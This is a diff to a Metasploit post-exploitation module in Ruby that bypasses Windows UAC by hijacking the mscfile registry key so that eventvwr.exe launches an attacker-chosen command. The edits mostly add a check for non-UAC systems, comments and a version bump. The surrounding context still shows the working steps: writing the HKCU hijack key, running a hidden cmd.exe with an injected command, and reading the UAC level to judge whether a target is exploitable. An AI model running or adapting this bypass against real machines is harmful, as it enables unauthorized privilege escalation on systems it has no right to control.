@@ -121,8 +121,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.5',
-                        'DisclosureDate' => 'jan 6 2017',
+                        'Version'        => '$Revision: 1.6',
+                        'DisclosureDate' => 'jan 8 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
@@ -220,7 +220,16 @@ def ls_stage1
         print_line("")
         Rex::sleep(1.0)
         return nil
+      # a dword:nil value it means that we are running againts a 'non-uac-system'
+      elsif check_success.nil?
+        print_warning("UAC DWORD DATA EMPTY (NON-UAC-SYSTEM?)")
+        print_error("[ABORT]: module can not work under this condictions...")
+        print_error("Remote system its not vulnerable to the exploit code!")
+        print_line("")
+        Rex::sleep(1.0)
+        return nil
       else
+        # all good in UAC settings :D
         print_good("  exec => Target UAC set to: #{check_success} (exploitable)")
         Rex::sleep(1.0)
       end
@@ -244,7 +253,7 @@ def ls_stage1
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
  print_good("  exec => Hijacking process to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
- # give a proper time to refresh regedit
+ # give a proper time to refresh regedit 'enigma0x3' :D
  Rex::sleep(4.5)
 
       # start remote service to gain code execution
@@ -338,9 +347,9 @@ def ls_stage3
 
   r=''
   session = client
-  vuln_soft = "eventvwr.exe"                         # vulnerable software name
-  uac_level = "ConsentPromptBehaviorAdmin"           # uac level key
-  vuln_hive = "HKCR\\mscfile\\shell\\open\\command"  # vulnerable hive key call (mmc.exe)
+  vuln_soft = "eventvwr.exe" # vulnerable software name
+  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
+  vuln_hive = "HKCR\\mscfile\\shell\\open\\command" # vulnerable hive key call (mmc.exe)
   vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
@@ -374,16 +383,20 @@ def ls_stage3
 
     # check target registry hive/key settings (UAC level settings)
     check_uac = registry_getvaldata("#{uac_hivek}","#{uac_level}")
+    # a dword:2 value it means 'always notify' setting is active.
     if check_uac == 2
       report_level = "ALWAYS NOTIFY (NOT EXPLOITABLE)"
+    # a dword:nil value it means that we are running againts a 'non-uac-system'
     elsif check_uac.nil?
-      report_level = "DWORD DATA EMPTY (NON-WINDOWS?)"
+      report_level = "DWORD DATA EMPTY (NON-UAC-SYSTEM?)"
     else
+      # all good in UAC settings :D
       report_level = "#{check_uac} (EXPLOITABLE)"
     end
 
   print_line("")
   # display target registry settings to user...
+  # i hope you are smart enouth to recognise a vulnerable output :D
   print_line("VULNERABLE_SOFT : #{vuln_soft}")
   print_line("    UAC_LEVEL   : #{report_level}")
   print_line("    VULN_HIVE   : #{vuln_hive}")
@@ -434,7 +447,7 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
-    # check for proper operative system (windows)
+    # check for proper operative system (windows-not-wine)
     if not oscheck == "Windows_NT"
       print_error("[ ABORT ]: This module only works againts windows systems")
       return nil
